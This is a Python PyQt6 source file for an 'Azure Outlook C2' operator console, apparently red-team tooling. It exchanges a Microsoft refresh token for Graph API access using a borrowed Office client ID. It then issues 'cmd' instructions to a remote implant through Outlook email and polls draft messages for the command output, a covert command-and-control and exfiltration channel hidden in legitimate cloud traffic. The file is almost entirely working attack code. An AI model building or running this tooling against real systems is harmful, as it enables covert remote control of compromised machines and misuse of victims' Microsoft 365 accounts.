import sys, requests, re
from PyQt6 import QtCore, QtGui, QtWidgets
from PyQt6.QtGui import QPixmap
from colorama import (Fore as F, Back as B, Style as S)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

BR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT
def bullet(char,color):
    C=FB if color == 'B' else FR if color == 'R' else FG
    return SB+C+'['+ST+SB+char+SB+C+']'+ST+' '
info,err,ok = bullet('-','B'),bullet('!','R'),bullet('+','G')
 
# Custom QTextEdit Widget
class bcTextEdit(QtWidgets.QTextEdit):
    def __init__(self, parent):
        QtWidgets.QTextEdit.__init__(self)
        self.initUi()
        self.updateFont()
    
    def initUi(self):
        self.setObjectName(u"textEdit")
        self.setReadOnly(True)
        self.setTextColor(QtGui.QColor('#FFFFFF')) # White text

    def updateFont(self):
        self.setStyleSheet(
            "font-size: 24px;"
        )

    def contextMenuEvent(self, event):
        contextMenu = QtWidgets.QMenu(self)
        new = contextMenu.addAction("New")
        open = contextMenu.addAction("Open")
        clear = contextMenu.addAction("Clear")
        action = contextMenu.exec(event.globalPos())
        if action == clear:
            self.clear()

    def output(self, out):
        self.append(out)
    
# Custom QTextEdit Widget
class bcLineEdit(QtWidgets.QLineEdit):
    def __init__(self, parent):
        QtWidgets.QLineEdit.__init__(self)
        self.initUi()

    def initUi(self):
        self.setObjectName(u"lineEdit")

class mainWidget(QtWidgets.QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.setupUI()

    def setupUI(self):
        self.resize(980, 565)
 
        # Create the grid for the layout. We will put things in here to display
        self.gridLayout = QtWidgets.QGridLayout(self)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setVerticalSpacing(4)
        self.gridLayout.setContentsMargins(1, 4, 1, 4)

        # Label for displaying text like status
        self.label = QtWidgets.QLabel(self)
        self.label.setObjectName(u"label")
        # Add the Label to our Grid that we will display
        self.gridLayout.addWidget(self.label, 3, 0, 1, 1)

        # LineEdit to take in user input
        self.lineEdit = bcLineEdit(self)
        # Add the LineEdit to our Grid 
        self.gridLayout.addWidget(self.lineEdit, 3, 1, 1, 1)

        # Big textbox to show output to the user
        #self.textEdit = QtWidgets.QTextEdit(self)
        self.textEdit = bcTextEdit(self)
        # Add the textbox to our Grid 
        self.gridLayout.addWidget(self.textEdit, 0, 0, 1, 2)

        # Label 
        self.label_2 = QtWidgets.QLabel(self)
        self.label_2.setObjectName(u"label_2")
        # Add the Label to our Grid
        self.gridLayout.addWidget(self.label_2, 2, 0, 1, 2)

        self.retranslateUi()
        QtCore.QMetaObject.connectSlotsByName(self)

    def retranslateUi(self):
        self.label.setText(QtCore.QCoreApplication.translate("Form", u"ID >", None))
        self.lineEdit.setText("")
        self.label_2.setText(QtCore.QCoreApplication.translate("Form", u"[ID]", None))
    
    def echoCommand(self):
        text = self.lineEdit.text()
        if text == '':
            return
        self.textEdit.setTextColor(QtGui.QColor('#FFFFFF'))
        self.textEdit.output("{} {}".format("Agent>",text))
    
    def parseCommand(self):
       command = self.lineEdit.text()
       command = command.split(" ")
       metaCommand = command.pop(0) # remove the first word from the command array and save as the metacommand
       subCommand = ' '.join(map(str,command)) # Convert the command array back into a string. Returns the subcommand
       #self.textEdit.append("  {} {}".format("MetaCommand:",metaCommand))
       #self.textEdit.append("  {} {}".format("SubCommand: ",subCommand))
       if metaCommand == "help":
           self.helpMenu()
       if metaCommand == "cmd":
           self.sendCommand(subCommand)
       if metaCommand == "nap":
           self.changeNapTime(subCommand)
       if metaCommand == "clear":
            self.textEdit.clear()

    def helpMenu(self):
        r1 = "{0:<8s} -   {1}".format("help","This help menu.")
        r2 = "{0:<8s}-   {1}".format("cmd","Execute a command.")
        r3 = "{0:<8s} -   {1}".format("nap","Time between C2 communications.")
        r4 = "{0:<8s} -   {1}".format("clear","Clear output from display.")
        menu = "{}\n{}\n{}\n{}".format(r1,r2,r3,r4)
        self.textEdit.setTextColor(QtGui.QColor('#4367FF')) # Blue
        self.textEdit.append(menu)

    def changeNapTime(self, t):
        try:
            regex = '^[0-9]{4,20}$'
            if re.match(regex, t):
                status = "Changing nap time to {} seconds".format(int(t)/1000)
            else:
                status = "[!] Error! Nap time must be >1000 (milliseconds)"
            timer.setInterval(int(t))
            self.textEdit.setTextColor(QtGui.QColor('#4367FF')) # Blue
            self.textEdit.append(status)
        except:
            print("[!] Failed to change nap time")

    def clearCommandInput(self):
        self.lineEdit.setText("")

    # Event handlers
    def getOutput(self):
        # This global variable persists across the GET requests and makes sure not to duplicate output
        global lastOutput
        try:
            lastOutput
        except:
            lastOutput = ""
            global init
            init = 0
            print("lastOutput:{}, init:{}".format(lastOutput,init))
        site = token.resource
        url = "{}/v1.0/me/MailFolders/drafts/messages".format(site)
        # The agent sends the command output and then a blank draft. Cmd output is second newest draft
        params = {"select":"body","top":"2"}
        headers = {"Authorization":"Bearer {}".format(token.access)}
        try:
            print("sending request to get output")
            #response = session.get(url=url, headers=headers, params=params, verify=False, proxies=proxies)
            response = session.get(url=url, headers=headers, params=params, verify=False)
            if response.status_code == 200:
                output = response.json()['value'][0]['body']['content']
                # If blank then previous is the command output
                if output == "":
                    # Get the command output
                    output = response.json()['value'][1]['body']['content']
                print("lastOutput: {}".format(lastOutput))
                # If theres a \n at the end delete it so we dont get an extra null line in the GUI
                if re.search(r'[\r\n]{1,2}$',output):
                    output = re.sub(r'\n$','',output)
                    output = re.sub(r'\r$','',output)
                if output == lastOutput:
                    print("output: {}".format(output))
                    return
                lastOutput = output
                # If the last output starts with "cmd " its our command - dont echo it
                if re.search(r'^cmd ',output):
                    return
                if init == 0:
                    init = 1
                    print("init:{}".format(init))
                    return
                print("init:{}".format(init))
                self.textEdit.setTextColor(QtGui.QColor('#FF2600')) # Red
                self.textEdit.append(output)
            else:
                return
        except:
            return

    def sendCommand(self, command):
        site = token.resource
        url = "{}/v1.0/me/messages".format(site)
        headers = {
                    "Content-Type":"application/json",
                    "Authorization":"Bearer {}".format(token.access)
                  }
        data = {
                    "subject":"Azure Outlook Command & Control", 
                    "importance" :"High", 
                    "body" : {
                        "contentType":"TEXT", 
                        "content" : "cmd {}".format(command)
                    }, 
                    "toRecipients" : [
                        {"emailAddress":{"address":"Bobby.Cooke@0xBoku.com"}}
                    ]
                 }
        try:
            #response = session.post(url=url, headers=headers, json=data, verify=False, proxies=proxies)
            response = session.post(url=url, headers=headers, json=data, verify=False)
        except:
            return

class GuiMainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.resize(980, 565)
        self.ChangeWindowTitle("Azure Outlook C2")
        self.mainWidget = mainWidget(self)
        self.setCentralWidget(self.mainWidget)
        self.show()

    def ChangeWindowTitle(self,windowTitle):
        self.setWindowTitle(QtCore.QCoreApplication.translate("Form", windowTitle, None))

    def keyPressEvent(self, event):
        key = event.key()
        # If Esc key is pressed, then exit the program
        if key == QtCore.Qt.Key.Key_Escape.value:
            self.close()
        # Key_Enter = Numpad Enter & Key_Return = normal Enter
        elif key == QtCore.Qt.Key.Key_Enter.value or QtCore.Qt.Key.Key_Return.value:
            self.mainWidget.echoCommand()
            self.mainWidget.parseCommand()
            self.mainWidget.clearCommandInput()

class Token(object):
    def __init__(self):
        self.refresh  = (
                          "REPLACE THIS"
                        )
        self.access    = ""
        self.userName  = ""
        self.tenantId  = "REPLACE THIS"
        self.clientId  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        self.userAgent = "Mozilla"
        self.resource  = "https://graph.microsoft.com"
        self.grantType = "refresh_token"
        self.scope     = "openid"

def getMsGraphAccessToken(Token):
    siteName  = "https://login.microsoftonline.com"
    path = "/{}/oauth2/token?api-version=1.0".format(Token.tenantId)
    url = siteName+path
    params = {  "resource":Token.resource,
                "client_id":Token.clientId,
                "grant_type":Token.grantType,
                "refresh_token":Token.refresh,
                "scope":Token.scope
             }
    try:
        #response = requests.post(url=url, data=params, verify=False, timeout=50, proxies=proxies)
        response = requests.post(url=url, data=params, verify=False, timeout=50)
        Token.access = response.json()['access_token']
    except requests.exceptions.HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')

if __name__ == "__main__":
    session = requests.Session()
    token = Token()
    napTime = 5000
    getMsGraphAccessToken(token)
    #print("Access Token: {}".format(token.access))
    # Launch GUI App
    app = QtWidgets.QApplication(sys.argv)
    ex = GuiMainWindow()
    # Qt Signals (GUI to Server communications)
    # Poll the server for new messages from the agent
    timer = QtCore.QTimer()
    timer.timeout.connect(lambda: ex.mainWidget.getOutput())
    timer.start(napTime)
    sys.exit(app.exec())
